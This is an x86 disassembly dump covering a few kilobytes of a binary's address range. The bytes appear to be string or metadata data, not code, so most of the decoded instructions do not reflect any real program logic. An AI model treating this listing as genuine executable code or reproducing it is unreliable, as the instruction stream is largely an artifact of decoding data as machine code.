  4070a6:	jb     0x407111
  4070a8:	bound  esi,QWORD PTR [ebp+0x74]
  4070ab:	add    BYTE PTR gs:[ebp+eiz*2+0x62],al
  4070b0:	jne    0x407119
  4070b2:	imul   ebp,DWORD PTR [bp+0x67],0x65646f4d
  4070ba:	jae    0x4070bc
  4070bc:	push   ebx
  4070bd:	jns    0x407132
  4070bf:	je     0x407126
  4070c1:	ins    DWORD PTR es:[edi],dx
  4070c2:	cs push edx
  4070c4:	jne    0x407134
  4070c6:	je     0x407131
  4070c8:	ins    DWORD PTR es:[edi],dx
  4070c9:	gs cs inc ebx
  4070cc:	outs   dx,DWORD PTR ds:[esi]
  4070cd:	ins    DWORD PTR es:[edi],dx
  4070ce:	jo     0x407139
  4070d0:	ins    BYTE PTR es:[edi],dx
  4070d1:	gs jb  0x407127
  4070d4:	gs jb  0x40714d
  4070d7:	imul   esp,DWORD PTR [ebx+0x65],0x6f430073
  4070de:	ins    DWORD PTR es:[edi],dx
  4070df:	jo     0x40714a
  4070e1:	ins    BYTE PTR es:[edi],dx
  4070e2:	popa   
  4070e3:	je     0x40714e
  4070e5:	outs   dx,DWORD PTR ds:[esi]
  4070e6:	outs   dx,BYTE PTR ds:[esi]
  4070e7:	push   edx
  4070e8:	gs ins BYTE PTR es:[edi],dx
  4070ea:	popa   
  4070eb:	js     0x40714e
  4070ed:	je     0x407158
  4070ef:	outs   dx,DWORD PTR ds:[esi]
  4070f0:	outs   dx,BYTE PTR ds:[esi]
  4070f1:	jae    0x407134
  4070f3:	je     0x407169
  4070f5:	jb     0x407160
  4070f7:	bound  esi,QWORD PTR [ebp+0x74]
  4070fa:	add    BYTE PTR gs:[edx+0x75],dl
  4070fe:	outs   dx,BYTE PTR ds:[esi]
  4070ff:	je     0x40716a
  407101:	ins    DWORD PTR es:[edi],dx
  407102:	gs inc ebx
  407104:	outs   dx,DWORD PTR ds:[esi]
  407105:	ins    DWORD PTR es:[edi],dx
  407106:	jo     0x407169
  407108:	je     0x407173
  40710a:	bound  ebp,QWORD PTR [ecx+0x6c]
  40710d:	imul   esi,DWORD PTR [ecx+edi*2+0x41],0x69727474
  407115:	bound  esi,QWORD PTR [ebp+0x74]
  407118:	add    BYTE PTR gs:[ecx+0x69],cl
  40711c:	jae    0x407163
  40711e:	js     0x407190
  407120:	jb     0x407187
  407122:	jae    0x407197
  407124:	popa   
  407125:	fs ins DWORD PTR es:[edi],dx
  407127:	imul   ebp,DWORD PTR [esi+0x43],0x5300646d
  40712e:	je     0x4071a2
  407130:	imul   ebp,DWORD PTR [esi+0x67],0x6c6c4400
  407137:	dec    ecx
  407138:	ins    DWORD PTR es:[edi],dx
  407139:	jo     0x4071aa
  40713b:	jb     0x4071b1
  40713d:	inc    ecx
  40713e:	je     0x4071b4
  407140:	jb     0x4071ab
  407142:	bound  esi,QWORD PTR [ebp+0x74]
  407145:	add    BYTE PTR gs:[ecx+0x69],ch
  407149:	jae    0x4071b0
  40714b:	js     0x4071bd
  40714d:	jb     0x4071b4
  40714f:	jae    0x4071c4
  407151:	push   0x65706c65
  407156:	jb     0x407186
  407158:	fs ins BYTE PTR es:[edi],dx
  40715a:	ins    BYTE PTR es:[edi],dx
  40715b:	add    BYTE PTR [ebp+0x61],cl
  40715e:	jb     0x4071d3
  407160:	push   0x50006c61
  407165:	je     0x4071d9
  407167:	push   esp
  407168:	outs   dx,DWORD PTR ds:[esi]
  407169:	push   ebx
  40716a:	je     0x4071de
  40716c:	imul   ebp,DWORD PTR [esi+0x67],0x696e55
  407173:	inc    edi
  407174:	gs je  0x4071ba
  407177:	jne    0x4071eb
  407179:	jb     0x4071e0
  40717b:	outs   dx,BYTE PTR ds:[esi]
  40717c:	je     0x40717e
  40717e:	inc    ebp
  40717f:	ins    BYTE PTR es:[edi],dx
  407180:	gs jbe 0x4071e4
  407183:	je     0x4071ea
  407185:	fs push esp
  407187:	popa   
  407188:	jae    0x4071f5
  40718a:	jae    0x40718c
  40718c:	push   ebp
  40718d:	outs   dx,BYTE PTR ds:[esi]
  40718e:	popa   
  40718f:	jne    0x407205
  407191:	push   0x7a69726f
  407196:	gs fs inc ecx
  407199:	arpl   WORD PTR [ebx+0x65],sp
  40719c:	jae    0x407211
  40719e:	inc    ebp
  40719f:	js     0x407204
  4071a1:	gs jo  0x407218
  4071a4:	imul   ebp,DWORD PTR [edi+0x6e],0x6e6f4300
  4071ab:	jae    0x40721c
  4071ad:	ins    BYTE PTR es:[edi],dx
  4071ae:	add    BYTE PTR gs:[ebx+0x79],dl
  4071b2:	jae    0x407228
  4071b4:	gs ins DWORD PTR es:[edi],dx
  4071b6:	cs dec ecx
  4071b8:	dec    edi
  4071b9:	add    BYTE PTR [ebp+eiz*2+0x78],dl
  4071bd:	je     0x407216
  4071bf:	jb     0x40722a
  4071c1:	je     0x407228
  4071c3:	jb     0x4071c5
  4071c5:	addr16 gs je 0x407228
  4071c9:	inc    ebp
  4071ca:	jb     0x40723e
  4071cc:	outs   dx,DWORD PTR ds:[esi]
  4071cd:	jb     0x4071cf
  4071cf:	addr16 gs je 0x407232
  4071d3:	dec    ebp
  4071d4:	gs jae 0x40724a
  4071d7:	popa   
  4071d8:	add    BYTE PTR gs:[di+0x6e],al
  4071dd:	jbe    0x407248
  4071df:	jb     0x407250
  4071e1:	outs   dx,BYTE PTR ds:[esi]
  4071e2:	ins    DWORD PTR es:[edi],dx
  4071e3:	outs   dx,BYTE PTR gs:[esi]
  4071e5:	je     0x4071e7
  4071e7:	addr16 gs je 0x40724a
  4071eb:	dec    esi
  4071ec:	gs ja  0x40723b
  4071ef:	imul   ebp,DWORD PTR [esi+0x65],0x70655200
  4071f6:	ins    BYTE PTR es:[edi],dx
  4071f7:	popa   
  4071f8:	arpl   WORD PTR [ebp+0x0],sp
  4071fb:	push   edi
  4071fc:	jb     0x407267
  4071fe:	je     0x407265
  407200:	dec    esp
  407201:	imul   ebp,DWORD PTR [esi+0x65],0x74656700
  407208:	pop    edi
  407209:	push   ebx
  40720a:	je     0x40726d
  40720c:	arpl   WORD PTR [ebx+0x54],bp
  40720f:	jb     0x407272
  407211:	arpl   WORD PTR [ebp+0x0],sp
  407214:	push   esp
  407215:	outs   dx,DWORD PTR ds:[esi]
  407216:	push   ebp
  407217:	jo     0x407289
  407219:	gs jb  0x407265
  40721c:	outs   dx,BYTE PTR ds:[esi]
  40721d:	jbe    0x407280
  40721f:	jb     0x40728a
  407221:	popa   
  407222:	outs   dx,BYTE PTR ds:[esi]
  407223:	je     0x407225
  407225:	cmp    al,0x50
  407227:	jb     0x407292
  407229:	jbe    0x40728c
  40722b:	je     0x407292
  40722d:	dec    ecx
  40722e:	ins    DWORD PTR es:[edi],dx
  40722f:	jo     0x40729d
  407231:	gs ins DWORD PTR es:[edi],dx
  407233:	outs   dx,BYTE PTR gs:[esi]
  407235:	je     0x407298
  407237:	je     0x4072a2
  407239:	outs   dx,DWORD PTR ds:[esi]
  40723a:	outs   dx,BYTE PTR ds:[esi]
  40723b:	inc    esp
  40723c:	gs je  0x4072a0
  40723f:	imul   ebp,DWORD PTR [ebx+esi*2+0x3e],0x3330447b
  407247:	inc    ebx
  407248:	xor    dh,BYTE PTR ds:0x342d3431
  40724e:	xor    DWORD PTR [eax],esi
  407250:	xor    eax,0x3243342d
  407255:	ss sub eax,0x43353842
  40725b:	sub    eax,0x44344343
  407260:	inc    edx
  407261:	xor    DWORD PTR [eax],edi
  407263:	inc    ebx
  407264:	xor    al,0x33
  407266:	cmp    BYTE PTR [edx+0x7d],al
  407269:	add    BYTE PTR [ebx+0x6f],al
  40726c:	ins    DWORD PTR es:[edi],dx
  40726d:	jo     0x4072d8
  40726f:	ins    BYTE PTR es:[edi],dx
  407270:	gs jb  0x4072ba
  407273:	outs   dx,BYTE PTR gs:[esi]
  407275:	gs jb  0x4072d9
  407278:	je     0x4072df
  40727a:	fs inc ecx
  40727c:	je     0x4072f2
  40727e:	jb     0x4072e9
  407280:	bound  esi,QWORD PTR [ebp+0x74]
  407283:	add    BYTE PTR gs:[ebx+0x79],dl
  407287:	jae    0x4072fd
  407289:	gs ins DWORD PTR es:[edi],dx
  40728b:	cs inc ebx
  40728d:	outs   dx,DWORD PTR ds:[esi]
  40728e:	ins    BYTE PTR es:[edi],dx
  40728f:	ins    BYTE PTR es:[edi],dx
  407290:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  407295:	outs   dx,BYTE PTR ds:[esi]
  407296:	jae    0x4072c6
  407298:	inc    edi
  407299:	outs   dx,BYTE PTR gs:[esi]
  40729b:	gs jb  0x407307
  40729e:	arpl   WORD PTR [eax],ax
  4072a0:	inc    esp
  4072a1:	imul   esp,DWORD PTR [ebx+0x74],0x616e6f69
  4072a8:	jb     0x407323
  4072aa:	pusha  
  4072ab:	xor    al,BYTE PTR [eax]
  4072ad:	and    al,0x24
  4072af:	ins    DWORD PTR es:[edi],dx
  4072b0:	gs je  0x40731b
  4072b3:	outs   dx,DWORD PTR ds:[esi]
  4072b4:	xor    BYTE PTR fs:[eax+0x36],bh
  4072b8:	xor    BYTE PTR [eax],dh
  4072ba:	xor    BYTE PTR [eax],dh
  4072bc:	xor    BYTE PTR [ecx],bh
  4072be:	sub    eax,0x64410031
  4072c3:	add    BYTE PTR fs:[edx+esi*2+0x79],dl
  4072c8:	inc    edi
  4072c9:	gs je  0x407322
  4072cc:	popa   
  4072cd:	ins    BYTE PTR es:[edi],dx
  4072ce:	jne    0x407335
  4072d0:	add    BYTE PTR [ebx+0x6f],al
  4072d3:	outs   dx,BYTE PTR ds:[esi]
  4072d4:	je     0x407337
  4072d6:	imul   ebp,DWORD PTR [esi+0x73],0x67724100
  4072dd:	jne    0x40734c
  4072df:	outs   dx,BYTE PTR gs:[esi]
  4072e1:	je     0x407332
  4072e3:	jne    0x407359
  4072e5:	dec    edi
  4072e6:	push   dx
  4072e8:	popa   
  4072e9:	outs   dx,BYTE PTR ds:[esi]
  4072ea:	addr16 gs inc ebp
  4072ed:	js     0x407352
  4072ef:	gs jo  0x407366
  4072f2:	imul   ebp,DWORD PTR [edi+0x6e],0x74655300
  4072f9:	jne    0x40736b
  4072fb:	inc    esi
  4072fc:	jb     0x407367
  4072fe:	outs   dx,BYTE PTR gs:[esi]
  407300:	fs ins BYTE PTR es:[edi],dx
  407302:	jns    0x40734c
  407304:	outs   dx,DWORD PTR ds:[esi]
  407305:	jae    0x40737b
  407307:	outs   dx,BYTE PTR ds:[esi]
  407308:	popa   
  407309:	ins    DWORD PTR es:[edi],dx
  40730a:	gs push ebp
  40730c:	jb     0x40737a
  40730e:	add    BYTE PTR [ebp+eiz*2+0x6c],al
  407312:	gs je  0x40737a
  407315:	inc    esi
  407316:	jb     0x407381
  407318:	outs   dx,BYTE PTR gs:[esi]
  40731a:	fs ins BYTE PTR es:[edi],dx
  40731c:	jns    0x407366
  40731e:	outs   dx,DWORD PTR ds:[esi]
  40731f:	jae    0x407395
  407321:	outs   dx,BYTE PTR ds:[esi]
  407322:	popa   
  407323:	ins    DWORD PTR es:[edi],dx
  407324:	gs push ebp
  407326:	jb     0x407394
  407328:	add    BYTE PTR [ebx+0x6f],al
  40732b:	outs   dx,BYTE PTR ds:[esi]
  40732c:	jbe    0x407393
  40732e:	jb     0x4073a4
  407330:	add    BYTE PTR [edi+ebp*2+0x49],dl
  407334:	outs   dx,BYTE PTR ds:[esi]
  407335:	je     0x40736a
  407337:	xor    al,BYTE PTR [eax]
  407339:	push   ebx
  40733a:	gs je  0x4073b2
  40733d:	jo     0x407392
  40733f:	jae    0x4073ad
  407341:	push   ebp
  407342:	jb     0x4073b0
  407344:	add    BYTE PTR [ebp+eiz*2+0x6c],al
  407348:	gs je  0x4073b0
  40734b:	push   ebx
  40734c:	jae    0x4073ba
  40734e:	push   ebp
  40734f:	jb     0x4073bd
  407351:	add    BYTE PTR [ebx+0x65],dl
  407354:	je     0x4073cb
  407356:	jo     0x4073ad
  407358:	jb     0x4073c6
  40735a:	add    BYTE PTR [ebp+eiz*2+0x6c],al
  40735e:	gs je  0x4073c6
  407361:	push   ebp
  407362:	jb     0x4073d0
  407364:	add    BYTE PTR [ebx+0x65],dl
  407367:	je     0x4073de
  407369:	jo     0x4073af
  40736b:	gs popaw 
  40736e:	jne    0x4073dc
  407370:	je     0x4073c7
  407372:	jb     0x4073e0
  407374:	jae    0x407376
  407376:	inc    ebx
  407377:	ins    BYTE PTR es:[edi],dx
  407378:	gs popa 
  40737a:	outs   dx,BYTE PTR ds:[esi]
  40737b:	jne    0x4073ed
  40737d:	inc    esp
  40737e:	gs popaw 
  407381:	jne    0x4073ef
  407383:	je     0x4073da
  407385:	jb     0x4073f3
  407387:	jae    0x407389
  407389:	push   edi
  40738a:	jb     0x4073f5
  40738c:	je     0x4073f3
  40738e:	add    BYTE PTR [esi+0x6f],al
  407391:	jb     0x407400
  407393:	popa   
  407394:	je     0x407396
  407396:	dec    ecx
  407397:	jae    0x4073e7
  407399:	jne    0x407407
  40739b:	ins    BYTE PTR es:[edi],dx
  40739c:	dec    edi
  40739d:	jb     0x4073e4
  40739f:	ins    DWORD PTR es:[edi],dx
  4073a0:	jo     0x407416
  4073a2:	jns    0x4073a4
  4073a4:	dec    esi
  4073a5:	outs   dx,DWORD PTR ds:[esi]
  4073a6:	je     0x4073f1
  4073a8:	ins    DWORD PTR es:[edi],dx
  4073a9:	jo     0x407417
  4073ab:	gs ins DWORD PTR es:[edi],dx
  4073ad:	outs   dx,BYTE PTR gs:[esi]
  4073af:	je     0x407416
  4073b1:	fs inc ebp
  4073b3:	js     0x407418
  4073b5:	gs jo  0x40742c
  4073b8:	imul   ebp,DWORD PTR [edi+0x6e],0x73734100
  4073bf:	gs ins DWORD PTR es:[edi],dx
  4073c1:	bound  ebp,QWORD PTR [ecx+edi*2+0x0]
  4073c5:	inc    edi
  4073c6:	gs je  0x40740e
  4073c9:	js     0x407430
  4073cb:	arpl   WORD PTR [ebp+0x74],si
  4073ce:	imul   ebp,DWORD PTR [esi+0x67],0x65737341
  4073d5:	ins    DWORD PTR es:[edi],dx
  4073d6:	bound  ebp,QWORD PTR [ecx+edi*2+0x0]
  4073da:	addr16 gs je 0x40743d
  4073de:	dec    esp
  4073df:	outs   dx,DWORD PTR ds:[esi]
  4073e0:	arpl   WORD PTR [ecx+0x74],sp
  4073e3:	imul   ebp,DWORD PTR [edi+0x6e],0x74615000
  4073ea:	push   0x74654700
  4073ef:	inc    esp
  4073f0:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  4073f7:	jns    0x407447
  4073f9:	popa   
  4073fa:	ins    DWORD PTR es:[edi],dx
  4073fb:	add    BYTE PTR gs:[ebx+0x6f],al
  4073ff:	ins    DWORD PTR es:[edi],dx
  407400:	bound  ebp,QWORD PTR [ecx+0x6e]
  407403:	add    BYTE PTR gs:[esi+0x69],al
  407407:	ins    BYTE PTR es:[edi],dx
  407408:	add    BYTE PTR gs:[edi+ebp*2+0x4c],dl
  40740d:	outs   dx,DWORD PTR ds:[esi]
  40740e:	ja     0x407475
  407410:	jb     0x40745b
  407412:	outs   dx,BYTE PTR ds:[esi]
  407413:	jbe    0x407476
  407415:	jb     0x407480
  407417:	popa   
  407418:	outs   dx,BYTE PTR ds:[esi]
  407419:	je     0x40741b
  40741b:	inc    ebp
  40741c:	jno    0x407493
  40741e:	popa   
  40741f:	ins    BYTE PTR es:[edi],dx
  407420:	jae    0x407422
  407422:	push   ebx
  407423:	jns    0x407498
  407425:	je     0x40748c
  407427:	ins    DWORD PTR es:[edi],dx
  407428:	cs push esp
  40742a:	gs js  0x4074a1
  40742d:	cs push edx
  40742f:	gs addr16 jne 0x40749f
  407433:	popa   
  407434:	jb     0x40747b
  407436:	js     0x4074a8
  407438:	jb     0x40749f
  40743a:	jae    0x4074af
  40743c:	imul   ebp,DWORD PTR [edi+0x6e],0x65520073
  407443:	addr16 gs js 0x407447
  407447:	push   edx
  407448:	gs addr16 gs js 0x40749c
  40744d:	jo     0x4074c3
  40744f:	imul   ebp,DWORD PTR [edi+0x6e],0x614d0073
  407456:	je     0x4074bb
  407458:	push   0x6f724700
  40745d:	jne    0x4074cf
  40745f:	inc    ebx
  407460:	outs   dx,DWORD PTR ds:[esi]
  407461:	ins    BYTE PTR es:[edi],dx
  407462:	ins    BYTE PTR es:[edi],dx
  407463:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  407468:	outs   dx,BYTE PTR ds:[esi]
  407469:	add    BYTE PTR [edi+0x65],ah
  40746c:	je     0x4074cd
  40746e:	inc    edi
  40746f:	jb     0x4074e0
  407471:	jne    0x4074e3
  407473:	jae    0x407475
  407475:	inc    edi
  407476:	jb     0x4074e7
  407478:	jne    0x4074ea
  40747a:	add    BYTE PTR [edi+0x65],ah
  40747d:	je     0x4074de
  40747f:	dec    ecx
  407480:	je     0x4074e7
  407482:	ins    DWORD PTR es:[edi],dx
  407483:	add    BYTE PTR [ebx+0x61],al
  407486:	jo     0x4074fc
  407488:	jne    0x4074fc
  40748a:	add    BYTE PTR gs:[edi+0x65],ah
  40748e:	je     0x4074ef
  407490:	push   esi
  407491:	popa   
  407492:	ins    BYTE PTR es:[edi],dx
  407493:	jne    0x4074fa
  407495:	add    BYTE PTR [esp],ah
  407498:	ins    DWORD PTR es:[edi],dx
  407499:	gs je  0x407504
  40749c:	outs   dx,DWORD PTR ds:[esi]
  40749d:	xor    BYTE PTR fs:[eax+0x36],bh
  4074a1:	xor    BYTE PTR [eax],dh
  4074a3:	xor    BYTE PTR [eax],dh
  4074a5:	xor    BYTE PTR [ebp+ebp*1+0x31],ah
  4074a9:	add    BYTE PTR [edi+0x65],ah
  4074ac:	je     0x40750d
  4074ae:	dec    esp
  4074af:	outs   dx,BYTE PTR gs:[esi]
  4074b1:	addr16 je 0x40751c
  4074b4:	add    BYTE PTR [edi+0x65],ah
  4074b7:	je     0x407518
  4074b9:	inc    ebx
  4074ba:	push   0x737261
  4074bf:	inc    ebx
  4074c0:	outs   dx,DWORD PTR ds:[esi]
  4074c1:	outs   dx,BYTE PTR ds:[esi]
  4074c2:	arpl   WORD PTR [ecx+0x74],sp
  4074c5:	add    BYTE PTR [ecx+0x72],al
  4074c8:	addr16 jne 0x407538
  4074cb:	outs   dx,BYTE PTR gs:[esi]
  4074cd:	je     0x407514
  4074cf:	js     0x407534
  4074d1:	gs jo  0x407548
  4074d4:	imul   ebp,DWORD PTR [edi+0x6e],0x63632e00
  4074db:	je     0x40754c
  4074dd:	jb     0x4074df
  4074df:	outs   dx,DWORD PTR ds:[esi]
  4074e0:	ins    BYTE PTR es:[edi],dx
  4074e1:	xor    esi,DWORD PTR gs:[edx]
  4074e4:	cs fs ins BYTE PTR es:[edi],dx
  4074e7:	ins    BYTE PTR es:[edi],dx
  4074e8:	add    BYTE PTR [ecx+edi*2+0x70],dl
  4074ec:	add    BYTE PTR gs:[edx+0x75],dl
  4074f0:	outs   dx,BYTE PTR ds:[esi]
  4074f1:	je     0x40755c
  4074f3:	ins    DWORD PTR es:[edi],dx
  4074f4:	gs push esp
  4074f6:	jns    0x407568
  4074f8:	gs dec eax
  4074fa:	popa   
  4074fb:	outs   dx,BYTE PTR ds:[esi]
  4074fc:	fs ins BYTE PTR es:[edi],dx
  4074fe:	add    BYTE PTR gs:[edi+0x65],al
  407502:	je     0x407558
  407504:	jns    0x407576
  407506:	gs inc esi
  407508:	jb     0x407579
  40750a:	ins    DWORD PTR es:[edi],dx
  40750b:	dec    eax
  40750c:	popa   
  40750d:	outs   dx,BYTE PTR ds:[esi]
  40750e:	fs ins BYTE PTR es:[edi],dx
  407510:	add    BYTE PTR gs:[ebx+0x69],dl
  407514:	jp     0x40757b
  407516:	dec    edi
  407517:	data16 add BYTE PTR [edi+ebp*2+0x53],dl
  40751c:	je     0x407590
  40751e:	imul   ebp,DWORD PTR [esi+0x67],0x616c4600
  407525:	addr16 jae 0x407569
  407528:	je     0x40759e
  40752a:	jb     0x407595
  40752c:	bound  esi,QWORD PTR [ebp+0x74]
  40752f:	add    BYTE PTR gs:[ebx+0x74],dl
  407533:	jb     0x4075aa
  407535:	arpl   WORD PTR [esp+ecx*2+0x61],si
  407539:	jns    0x4075aa
  40753b:	jne    0x4075b1
  40753d:	inc    ecx
  40753e:	je     0x4075b4
  407540:	jb     0x4075ab
  407542:	bound  esi,QWORD PTR [ebp+0x74]
  407545:	add    BYTE PTR gs:[ecx+eiz*2+0x79],cl
  40754a:	outs   dx,DWORD PTR ds:[esi]
  40754b:	jne    0x4075c1
  40754d:	dec    ebx
  40754e:	imul   ebp,DWORD PTR [esi+0x64],0x6d6f4300
  407555:	dec    ecx
  407556:	ins    DWORD PTR es:[edi],dx
  407557:	jo     0x4075c8
  407559:	jb     0x4075cf
  40755b:	inc    ecx
  40755c:	je     0x4075d2
  40755e:	jb     0x4075c9
  407560:	bound  esi,QWORD PTR [ebp+0x74]
  407563:	add    BYTE PTR gs:[edi+0x75],al
  407567:	imul   esp,DWORD PTR [ecx+eax*2+0x74],0x62697274
  40756f:	jne    0x4075e5
  407571:	add    BYTE PTR gs:[ecx+0x6e],cl
  407575:	je     0x4075dc
  407577:	jb     0x4075df
  407579:	popa   
  40757a:	arpl   WORD PTR [ebp+0x54],sp
  40757d:	jns    0x4075ef
  40757f:	gs inc ecx
  407581:	je     0x4075f7
  407583:	jb     0x4075ee
  407585:	bound  esi,QWORD PTR [ebp+0x74]
  407588:	add    BYTE PTR gs:[ebx+0x6f],al
  40758c:	ins    DWORD PTR es:[edi],dx
  40758d:	dec    ecx
  40758e:	outs   dx,BYTE PTR ds:[esi]
  40758f:	je     0x4075f6
  407591:	jb     0x4075f9
  407593:	popa   
  407594:	arpl   WORD PTR [ebp+0x54],sp
  407597:	jns    0x407609
  407599:	add    BYTE PTR gs:[eax+0x72],dl
  40759d:	gs jae 0x407605
  4075a0:	jb     0x407618
  4075a2:	gs push ebx
  4075a4:	imul   esp,DWORD PTR [edi+0x41],0x69727474
  4075ab:	bound  esi,QWORD PTR [ebp+0x74]
  4075ae:	add    BYTE PTR gs:[ebx+0x79],dl
  4075b2:	jae    0x407628
  4075b4:	gs ins DWORD PTR es:[edi],dx
  4075b6:	cs inc ebx
  4075b8:	outs   dx,DWORD PTR ds:[esi]
  4075b9:	fs gs inc esp
  4075bc:	outs   dx,DWORD PTR ds:[esi]
  4075bd:	ins    DWORD PTR es:[edi],dx
  4075be:	cs inc ebx
  4075c0:	outs   dx,DWORD PTR ds:[esi]
  4075c1:	ins    DWORD PTR es:[edi],dx
  4075c2:	jo     0x40762d
  4075c4:	ins    BYTE PTR es:[edi],dx
  4075c5:	gs jb  0x4075c8
  4075c8:	inc    edi
  4075c9:	outs   dx,BYTE PTR gs:[esi]
  4075cb:	gs jb  0x40762f
  4075ce:	je     0x407635
  4075d0:	fs inc ebx
  4075d2:	outs   dx,DWORD PTR ds:[esi]
  4075d3:	fs gs inc ecx
  4075d6:	je     0x40764c
  4075d8:	jb     0x407643
  4075da:	bound  esi,QWORD PTR [ebp+0x74]
  4075dd:	add    BYTE PTR gs:[ebp+eiz*2+0x62],al
  4075e2:	jne    0x40764b
  4075e4:	addr16 gs jb 0x407636
  4075e8:	outs   dx,DWORD PTR ds:[esi]
  4075e9:	outs   dx,BYTE PTR ds:[esi]
  4075ea:	push   ebp
  4075eb:	jae    0x407652
  4075ed:	jb     0x407632
  4075ef:	outs   dx,DWORD PTR ds:[esi]
  4075f0:	fs gs inc ecx
  4075f3:	je     0x407669
  4075f5:	jb     0x407660
  4075f7:	bound  esi,QWORD PTR [ebp+0x74]
  4075fa:	add    BYTE PTR gs:[edx+0x65],dl
  4075fe:	data16 gs jb 0x407667
  407602:	outs   dx,BYTE PTR ds:[esi]
  407603:	arpl   WORD PTR [ebp+0x45],sp
  407606:	jno    0x40767d
  407608:	popa   
  407609:	ins    BYTE PTR es:[edi],dx
  40760a:	jae    0x40760c
  40760c:	addr16 gs je 0x40766f
  407610:	inc    ecx
  407611:	jae    0x407686
  407613:	gs ins DWORD PTR es:[edi],dx
  407615:	bound  ebp,QWORD PTR [ecx+edi*2+0x0]
  407619:	inc    edi
  40761a:	gs je  0x407670
  40761d:	je     0x407691
  40761f:	imul   ebp,DWORD PTR [esi+0x67],0x73795300
  407626:	je     0x40768d
  407628:	ins    DWORD PTR es:[edi],dx
  407629:	cs inc ebx
  40762b:	outs   dx,DWORD PTR ds:[esi]
  40762c:	ins    DWORD PTR es:[edi],dx
  40762d:	jo     0x40769e
  40762f:	outs   dx,BYTE PTR ds:[esi]
  407630:	outs   dx,BYTE PTR gs:[esi]
  407632:	je     0x407681
  407634:	outs   dx,DWORD PTR ds:[esi]
  407635:	fs gs ins BYTE PTR es:[edi],dx
  407638:	add    BYTE PTR [ebp+0x64],al
  40763b:	imul   esi,DWORD PTR [edi+ebp*2+0x72],0x776f7242
  407643:	jae    0x4076a6
  407645:	bound  ebp,QWORD PTR [ebp+eiz*2+0x41]
  407649:	je     0x4076bf
  40764b:	jb     0x4076b6
  40764d:	bound  esi,QWORD PTR [ebp+0x74]
  407650:	add    BYTE PTR gs:[ebp+0x64],al
  407654:	imul   esi,DWORD PTR [edi+ebp*2+0x72],0x776f7242
  40765c:	jae    0x4076bf
  40765e:	bound  ebp,QWORD PTR [ebp+eiz*2+0x53]
  407662:	je     0x4076c5
  407664:	je     0x4076cb
  407666:	add    BYTE PTR [ecx+0x6e],cl
  407669:	je     0x4076bb
  40766b:	je     0x4076df
  40766d:	add    BYTE PTR [edx+0x65],bl
  407670:	jb     0x4076e1
  407672:	add    BYTE PTR [ebx+0x61],dl
  407675:	gs dec ax
  407678:	popa   
  407679:	outs   dx,BYTE PTR ds:[esi]
  40767a:	fs ins BYTE PTR es:[edi],dx
  40767c:	add    BYTE PTR gs:[ebx+0x65],dl
  407680:	je     0x4076ca
  407682:	popa   
  407683:	outs   dx,BYTE PTR ds:[esi]
  407684:	fs ins BYTE PTR es:[edi],dx
  407686:	add    BYTE PTR gs:[ebx+0x74],dl
  40768a:	jb     0x4076f5
  40768c:	outs   dx,BYTE PTR ds:[esi]
  40768d:	addr16 push esp
  40768f:	outs   dx,DWORD PTR ds:[esi]
  407690:	dec    eax
  407691:	inc    edi
  407692:	ins    BYTE PTR es:[edi],dx
  407693:	outs   dx,DWORD PTR ds:[esi]
  407694:	bound  esp,QWORD PTR [ecx+0x6c]
  407697:	push   ebp
  407698:	outs   dx,BYTE PTR ds:[esi]
  407699:	imul   eax,DWORD PTR [eax],0x6f6c6c41
  40769f:	arpl   WORD PTR [eax+0x47],cx
  4076a2:	ins    BYTE PTR es:[edi],dx
  4076a3:	outs   dx,DWORD PTR ds:[esi]
  4076a4:	bound  esp,QWORD PTR [ecx+0x6c]
  4076a7:	add    BYTE PTR [edi+0x65],ah
  4076aa:	je     0x40770b
  4076ac:	dec    ecx
  4076ad:	jae    0x4076f8
  4076af:	outs   dx,BYTE PTR ds:[esi]
  4076b0:	jbe    0x407713
  4076b2:	ins    BYTE PTR es:[edi],dx
  4076b3:	imul   esp,DWORD PTR [eax+eax*1+0x49],0x6c61766e
  4076bb:	imul   esp,DWORD PTR [edi+ecx*2+0x70],0x74617265
  4076c3:	imul   ebp,DWORD PTR [edi+0x6e],0x65637845
  4076ca:	jo     0x407740
  4076cc:	imul   ebp,DWORD PTR [edi+0x6e],0x72745300
  4076d3:	jne    0x407738
  4076d5:	je     0x40774c
  4076d7:	jb     0x40773e
  4076d9:	push   esp
  4076da:	outs   dx,DWORD PTR ds:[esi]
  4076db:	push   eax
  4076dc:	je     0x407750
  4076de:	add    BYTE PTR [eax+0x74],dl
  4076e1:	jb     0x407737
  4076e3:	outs   dx,DWORD PTR ds:[esi]
  4076e4:	push   ebx
  4076e5:	je     0x407759
  4076e7:	jne    0x40774c
  4076e9:	je     0x407760
  4076eb:	jb     0x407752
  4076ed:	add    BYTE PTR [esi+0x72],al
  4076f0:	gs gs dec eax
  4076f3:	inc    edi
  4076f4:	ins    BYTE PTR es:[edi],dx
  4076f5:	outs   dx,DWORD PTR ds:[esi]
  4076f6:	bound  esp,QWORD PTR [ecx+0x6c]
  4076f9:	add    BYTE PTR [ebx+0x65],dl
  4076fc:	je     0x407746
  4076fe:	popa   
  4076ff:	outs   dx,BYTE PTR ds:[esi]
  407700:	fs ins BYTE PTR es:[edi],dx
  407702:	gs inc ecx
  407704:	jae    0x40774f
  407706:	outs   dx,BYTE PTR ds:[esi]
  407707:	jbe    0x40776a
  407709:	ins    BYTE PTR es:[edi],dx
  40770a:	imul   esp,DWORD PTR [eax+eax*1+0x6b],0x656e7265
  407712:	ins    BYTE PTR es:[edi],dx
  407713:	xor    esi,DWORD PTR [edx]
  407715:	cs fs ins BYTE PTR es:[edi],dx
  407718:	ins    BYTE PTR es:[edi],dx
  407719:	add    BYTE PTR [edi+0x65],ah
  40771c:	je     0x40777d
  40771e:	dec    esi
  40771f:	popa   
  407720:	ins    DWORD PTR es:[edi],dx
  407721:	add    BYTE PTR gs:[edx+0x65],dl
  407725:	popa   
  407726:	fs dec ecx
  407728:	outs   dx,BYTE PTR ds:[esi]
  407729:	je     0x40777b
  40772b:	je     0x40779f
  40772d:	add    BYTE PTR [edi+0x70],ch
  407730:	pop    edi
  407731:	dec    ecx
  407732:	outs   dx,BYTE PTR ds:[esi]
  407733:	gs jno 0x4077ab
  407736:	popa   
  407737:	ins    BYTE PTR es:[edi],dx
  407738:	imul   esi,DWORD PTR [ecx+edi*2+0x0],0x6d697254
  407740:	add    BYTE PTR [ebx+0x79],dl
  407743:	jae    0x4077b9
  407745:	gs ins DWORD PTR es:[edi],dx
  407747:	cs dec esi
  407749:	gs je  0x40774c
  40774c:	inc    esp
